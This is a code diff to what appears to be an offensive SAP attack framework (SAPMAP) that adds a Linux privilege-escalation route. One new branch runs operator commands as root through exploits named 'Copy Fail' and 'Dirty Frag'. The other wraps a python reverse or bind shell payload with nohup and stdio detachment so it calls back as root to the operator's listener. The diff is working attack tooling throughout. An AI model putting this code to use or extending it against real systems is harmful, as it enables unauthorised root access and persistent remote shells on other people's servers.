@@ -6569,6 +6569,28 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 "error": lpe_res.get("error") or "",
                 "winlpe_method": lpe_res.get("method", ""),
             }
+        elif method == "linuxlpe_root":
+            # Linux mirror of winlpe_system: route the operator command
+            # through the Linux-LPE picker (Copy Fail preferred, Dirty
+            # Frag fallback).  The picker wraps the command in a root
+            # shell script + writes captured stdout to a result file +
+            # reads it back via base64.  Returns the same
+            # {ok, stdout, method, error} shape as run_windows_lpe.
+            from sapmap_lpe_auto import run_linux_lpe
+            full = cmdline if cmdline else (
+                command + (" " + params if params else "")).strip()
+            if not full:
+                return json.dumps({"error": "No command for linuxlpe_root"})
+            print(f"[*] {sid}: OS terminal — routing through Linux LPE "
+                  f"for root context (cmd: {full[:80]!r})")
+            lpe_res = run_linux_lpe(node, full)
+            result = {
+                "success": bool(lpe_res.get("ok")),
+                "output": (lpe_res.get("stdout") or "").splitlines() or [
+                    "(no output)" if lpe_res.get("ok") else ""],
+                "error": lpe_res.get("error") or "",
+                "linuxlpe_method": lpe_res.get("method", ""),
+            }
         else:
             return json.dumps({"error": f"Unknown method: {method}"})
 
@@ -6812,6 +6834,77 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     print(f"[+] {sid}: SYSTEM shell payload spawned "
                           f"via {lpe_res.get('method')}; expect "
                           f"connection as NT AUTHORITY\\SYSTEM")
+            elif method == "linuxlpe_root":
+                # Linux mirror of winlpe_system: spawn the reverse /
+                # bind shell payload as root via the Linux-LPE picker
+                # (Copy Fail preferred, Dirty Frag fallback).  The
+                # picker writes a wrapper script that runs the
+                # operator command under a root token, then forks +
+                # execve's su to inherit it.
+                #
+                # The Linux shell payload is a python3 socket trick
+                # (see _generate_payload's else branch): it writes to
+                # the network socket, not stdout, so we wrap it in
+                # ``nohup ... </dev/null >/dev/null 2>&1 &`` to detach
+                # the python process before the wrapper script returns.
+                # That way the root wrapper exits cleanly + the result
+                # file gets written empty, while the python reverse
+                # shell connects back as root to the operator's
+                # listener.
+                prog = payload.get("command", "")
+                params_str = payload.get("params", "")
+                if not prog:
+                    print(f"[-] {sid}: linuxlpe_root shell needs a "
+                          f"Linux payload (command missing) - target "
+                          f"may not be Linux")
+                    with _shell_lock:
+                        if _shell_session:
+                            _shell_session.status = "error"
+                            _shell_session.error_msg = (
+                                "linuxlpe_root requires a Linux target "
+                                "with a python3 / shell payload")
+                    return
+
+                _set_progress(
+                    "Wrapping shell payload for root elevation "
+                    "(nohup + stdio detach + background)...")
+                # nohup so the child survives the wrapper exit;
+                # </dev/null >/dev/null 2>&1 so it has no inherited
+                # handles to the SAPXPG pipe; trailing & to background;
+                # outer (...) subshell so the trailing & doesn't
+                # combine with the wrapper's own redirect.
+                full_cmd = (
+                    f"(nohup {prog} {params_str} "
+                    f"</dev/null >/dev/null 2>&1 &)"
+                )
+
+                _set_progress("Routing payload through Linux LPE for "
+                              "root elevation (delivers Copy Fail / "
+                              "Dirty Frag + runs payload as root)...")
+                from sapmap_lpe_auto import run_linux_lpe
+                # fire_and_forget=True for symmetry with the Windows
+                # path - currently a no-op (copyfail/dirtyfrag's
+                # wrapper-script pattern handles empty result files
+                # naturally) but documents intent at the call site
+                # and gives us the hook if the runners ever gain
+                # pipe-capture mode.
+                lpe_res = run_linux_lpe(node, full_cmd,
+                                          fire_and_forget=True)
+                result = {
+                    "success": bool(lpe_res.get("ok")),
+                    "output": (lpe_res.get("stdout") or "").splitlines() or [
+                        f"(root shell payload dispatched via "
+                        f"{lpe_res.get('method', '?')})"
+                    ],
+                    "error": lpe_res.get("error", ""),
+                }
+                if not result["success"]:
+                    print(f"[-] {sid}: linuxlpe_root shell dispatch "
+                          f"failed: {result['error']}")
+                else:
+                    print(f"[+] {sid}: root shell payload spawned "
+                          f"via {lpe_res.get('method')}; expect "
+                          f"connection as root")
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
